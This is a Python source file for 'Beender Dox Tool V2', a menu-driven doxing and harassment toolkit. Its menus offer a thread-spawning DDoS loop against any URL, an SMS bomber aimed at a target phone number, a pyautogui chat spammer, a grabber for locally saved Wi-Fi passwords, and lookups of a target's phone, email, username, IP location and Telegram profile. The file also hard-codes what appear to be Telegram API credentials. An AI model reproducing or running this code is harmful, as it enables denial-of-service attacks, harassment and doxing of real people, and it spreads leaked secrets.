import threading, time, ctypes, os, sys, json
from pystyle import *
from pystyle import Colorate, Colors
from helper import printer
from getpass import getpass
import getpass
from time import sleep
from utils import (
    email_search,
    search_username,
    ip_lookup,
    phonenumber_lookup,
    smsbomber,
    wifi_password_getter,
    fake_info_generator,
    caesar_cipher,
    basexx,
)

enter = Colorate.Horizontal(Colors.yellow_to_green, ('[>] To Continue Press "Enter"'))

user_name = getpass.getuser()
print(f"Welcome {user_name}!")
time.sleep(2)

def second_menu():
    while True:
      os.system("cls")
      os.system("title Beender V2")
    
      menu = (
    """
     _______    _______   _______  _____  ___   ________    _______   _______   
    |   _  "\  /"     "| /"     "|(\"   \|"  \ |"      "\  /"     "| /"      \  
    (. |_)  :)(: ______)(: ______)|.\\   \    |(.  ___  :)(: ______)|:        | 
    |:     \/  \/    |   \/    |  |: \.   \\  ||: \   ) || \/    |  |_____/   ) 
    (|  _  \\  // ___)_  // ___)_ |.  \    \. |(| (___\ || // ___)_  //      /  
    |: |_)  :)(:      "|(:      "||    \    \ ||:       :)(:      "||:  __   \  
    (_______/  \_______) \_______) \___|\____\)(________/  \_______)|__|  \___) 
    """
    )
    
      banner = (f"""

                        ═══════════════════════════════════════════════════════════════════════════
                        Version: {version}            Second Menu             WIFI connection: True
                        ═══════════════════════════════════════════════════════════════════════════
                        1. Phone Scrape (API)                                         2. SMS Bomber
                        3. Email Search                                               4. Base text
                        5. Decrypt/Encrypt                                            7. IP Lookup (Advanced)
                        8. Info Generator (Advanced)                                  9. Card OSINT
                        ═══════════════════════════════════════════════════════════════════════════
                                                         m. Main Menu
    """)


      print(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter(menu)))
      print(Colorate.Horizontal(Colors.yellow_to_green, (banner)))
      choice_menu2 = input(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter("[>] Choice function ----->      ")))


      if choice_menu2 == "1":
        no = str(input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a phone-number with country code ---->   \t"))))
        phonenumber_lookup.LookUp(no)
        input(enter)
      
      elif choice_menu2 == "2":
        number = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter the target phone number (with country code     ---->        \t")))
        count = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter the number of SMS to send ---->   \t")))
        throttle = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter the throttle time (in seconds) ---->  \t")))
        smsbomber.SMSBomber(number, count, throttle)
        input(enter)
  
      elif choice_menu2 == "3":
        email = str(input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a email address ---->  \t"))))
        email_search.Holehe(email)
        input(enter)
      
      elif choice_menu2 == "4":
        message = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a text to encode/decode ---->  \t")))
        mode = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a mode (encode/decode) ---->  \t")))
        encoding = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a encoding (64/32/16) ---->   \t")))
        basexx.BaseXX(message, mode, encoding)
        input(enter)
      
      elif choice_menu2 == "5":
        message = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a text to cipher/decipher ---->  \t")))
        shift = int(input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a number of shifts (0 to 25) --->  \t"))))
        if shift < 0 or shift > 25:
            printer.error("Invalid shift number, please choose a number between 0 and 25..!")
        mode = str(input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a mode (encrypt/decrypt/bruteforce) ---->    \t"))))
        caesar_cipher.CaesarCipher(message, shift, mode)
        input(enter)
        
      elif choice_menu2 == "7":
        ip = str(input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a IP address OR domain ---->  \t"))))
        ip_lookup.Lookup(ip)
        input(enter)
    
      elif choice_menu2 == "8":
        fake_info_generator.Generate()
        input(enter)
    
      elif choice_menu2 == "9":
         print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] In Developing")))
         input(enter)
    
      elif choice_menu2 == "m":
        main_menu()

      else:
        print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] Unknown function \"{choice_menu2}\", please choice function")))
        sleep(2)
    second_menu()

# faker
def set_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)


if __name__ == "__main__":
    title = "github.com/LouSkull"
    set_title(title)

intro = (
",-----.  ,------.,------.,--.  ,--.,------.  ,------.,------.  \n"
"|  |) /_ |  .---'|  .---'|  ,'.|  ||  .-.  \ |  .---'|  .--. ' \n"
"|  .-.  \|  `--, |  `--, |  |' '  ||  |  \  :|  `--, |  '--'.' \n"
"|  '--' /|  `---.|  `---.|  | `   ||  '--'  /|  `---.|  |\  \  \n"
"`------' `------'`------'`--'  `--'`-------' `------'`--' '--' \n"
'    Welcome to Beender Dox Tool, Press "ENTER" to continue! \n'
)


def clear_screen():
    os.system("cls")


if __name__ == "__main__":
    clear_screen()


def clear_screen():
    os.system("cls")


Anime.Fade(
    Center.Center(intro),
    Colors.yellow_to_green,
    Colorate.Vertical,
    interval=0.045,
    enter=True,
)

read_patch = 'main.folder\\version.txt'
with open(read_patch, 'r') as file:
  version = file.read()

import requests

def check_internet_connection():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        response.raise_for_status()
    except requests.RequestException as e:
        print(Colorate.Horizontal(Colors.yellow_to_green, (f"No internet connection: {e}")))
        sleep(3)
        exit()
  
check_internet_connection()

def main_menu():
    while True:
      os.system("cls")
      os.system("title Beender V2")
    
      menu = (
    """
     _______    _______   _______  _____  ___   ________    _______   _______   
    |   _  "\  /"     "| /"     "|(\"   \|"  \ |"      "\  /"     "| /"      \  
    (. |_)  :)(: ______)(: ______)|.\\   \    |(.  ___  :)(: ______)|:        | 
    |:     \/  \/    |   \/    |  |: \.   \\  ||: \   ) || \/    |  |_____/   ) 
    (|  _  \\  // ___)_  // ___)_ |.  \    \. |(| (___\ || // ___)_  //      /  
    |: |_)  :)(:      "|(:      "||    \    \ ||:       :)(:      "||:  __   \  
    (_______/  \_______) \_______) \___|\____\)(________/  \_______)|__|  \___) 
    """
    )
    
      banner = (f"""

    ═══════════════════════════════════════════════════════════════════════════
    Version: {version}              Menu             WIFI connection: True
    ═══════════════════════════════════════════════════════════════════════════
    1. Search In Database                                    2. WIFI Password
    3. Parser                                                4. Spamming       
    5. Ip Search                                             6. DDOS           
    7. Info Generator (FAKE)                                 8. Proxy Validator
    9. Username Search                                      10. Next Menu
    ═══════════════════════════════════════════════════════════════════════════
    e. EXIT                                                          v. VERSION

    """)

      print(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter(menu)))
      print(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter(banner)))
      choice = input(Colorate.Horizontal(Colors.yellow_to_green, Center.XCenter("[>] Choice function ----->      ")))
    
      if choice == "1":
        os.system("python main.folder\\number.py")
    
      elif choice == "2":
        printer.info(f"Scanning for locally saved Wi-Fi passwords...")
        wifi_password_getter.Scan()
        input(enter)


      elif choice == "3":
        print(Colorate.Horizontal(Colors.yellow_to_green, (
            """
    1. Telegram parser
    2. Web parser
    3. Discord parser
            """
        )))
        parser_choice = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter your choice ---->  ")))

        if parser_choice == "1":
            from telethon.sync import TelegramClient

            API_ID = '27843047'
            API_HASH = 'e4dd95d7e0d43d2d3cf9606f2c74d32f'

            def get_user_info(username):
                with TelegramClient('anon', API_ID, API_HASH) as client:
                    try:
                        user = client.get_entity(username)
                        user_id = user.id
                        first_name = user.first_name
                        last_name = user.last_name if user.last_name else ''
                        print(Colorate.Horizontal(Colors.yellow_to_green, (f"ID: {user_id}, Name: {first_name} {last_name}")))
                    except Exception as e:
                        print(f"Error: {str(e)}")
                        input(enter)

        elif parser_choice == "2":
            import requests
            from bs4 import BeautifulSoup

            def get_article_titles(url):
                response = requests.get(url)

                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    titles = soup.find_all('h2', class_='article-title') 

                    for title in titles:
                        print(title.text.strip())
                else:
                    print(f"[>] Failed to fetch the page. Status code: {response.status_code}")


            def main():
                url = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter the URL of the website to scrape ---->  ")))
                get_article_titles(url)

            if __name__ == '__main__':
                main()

            input(enter)

            def main():
                profile_link = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter target profile link ----->   ")))
                username = profile_link.split('/')[-1]

                print(Colorate.Horizontal(Colors.yellow_to_green, ("\n[>] Fetching user information...\n")))
                get_user_info(username)

            if __name__ == '__main__':
                main()
            input(enter)

        elif parser_choice == "3":
            print(Colorate.Horizontal(Colors.yellow_to_green, ("[>] In dev")))
            sleep(2)

        else:
            print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] Unknown function '{parser_choice}'")))
            input(enter)


      elif choice == "4":
        import pyautogui

        print(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Open your chat to spam")))
        sleep(5)
        while True:
          file = open("main.folder\spamming.txt", "r")
          for line in file:
              pyautogui.typewrite(line)
              pyautogui.press("enter")

      elif choice == "5":
        import json
        from urllib.request import urlopen

        a = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter A Target Ip ----> ")))

        ip = a
        response = urlopen("http://ipwho.is/" + ip + "?lang=ru")
        ipwhois = json.load(response)

        print("\033[92m")
        print("IP:", [ip])
        print("Тип IP:", "{0}".format(ipwhois["type"]))
        print("Успех:", "{0}".format(ipwhois["success"]))
        print(
            "Континент:",
            "{0} {1}".format(ipwhois["continent"], ipwhois["continent_code"]),
        )
        print(
            "Страна:", "{0} {1}".format(ipwhois["country"], ipwhois["country_code"])
        )
        print("Страны рядом:", "{0}".format(ipwhois["borders"]))
        print("Столица:", "{0}".format(ipwhois["capital"]))
        print("Регион:", "{0}".format(ipwhois["region"]))
        print("Код региона:", "{0}".format(ipwhois["region_code"]))
        print("Город:", "{0}".format(ipwhois["city"]))
        print("Приблизительное местоположение:")
        print("Широта:", "{0}".format(ipwhois["latitude"]))
        print("Долгота:", "{0}".format(ipwhois["longitude"]))
        print("Телефонный код страны:", "{0}".format(ipwhois["calling_code"]))
        print("Провайдер:", "{0}".format(ipwhois["connection"]["isp"]))
        print("Часовой пояс UTC:", "{0}".format(ipwhois["timezone"]["utc"]))
        print("Дата и время:", "{0}".format(ipwhois["timezone"]["current_time"]))
        print("\033[92m")

        input(enter)
    
      elif choice == "6":

        def dos():
            try:
                url = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter url ---->  ")))
                os.system("cls||clear")
                while True:
                    print(Colorate.Horizontal(Colors.yellow_to_green,(f"[>] DDOS GOING TO {url} "),))
                    requests.get(url)
            except requests.exceptions.MissingSchema:
                print(Colorate.Horizontal(Colors.yellow_to_green, ("[>]  I think you forgot https://")))
                sleep(2)
                exit()

        while True:
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()
         threading.Thread(target=dos).start()   


      elif choice == "7":
        print(Colorate.Horizontal(Colors.yellow_to_green, ("[>] IN DEV")))
        input(enter)


      elif choice == "8":

        def check_proxy(proxy):
            url = "http://www.example.com" 
            proxies = {"http": proxy, "https": proxy}

            try:
                response = requests.get(url, proxies=proxies, timeout=5)
                if response.status_code == 200:
                    return True
                else:
                    return False
            except Exception as e:
                return False

        def main():
            proxy = input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter the proxy to check (e.g., http://your-proxy.com)  ----->   ")))


            if check_proxy(proxy):
                print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] Proxy {proxy} is valid.")))
            else:
                print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] Proxy {proxy} is invalid.")))

        if __name__ == "__main__":
            main()
        input(enter)
    
      elif choice == "v":
        print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] Version {version}")))
        input(enter)
    
      elif choice == "e":
        sys.exit()
    
      elif choice == "9":

        username = str(input(Colorate.Horizontal(Colors.yellow_to_green, ("[>] Enter a Username ---->   \t")))).replace(" ", "_")
        search_username.Search(username)
        input(enter)
    
      elif choice == "10":
          second_menu()
          
      else:
        print(Colorate.Horizontal(Colors.yellow_to_green, (f"[>] Unknown function \"{choice}\", please choice function")))
        sleep(2)
        input(enter)

main_menu()
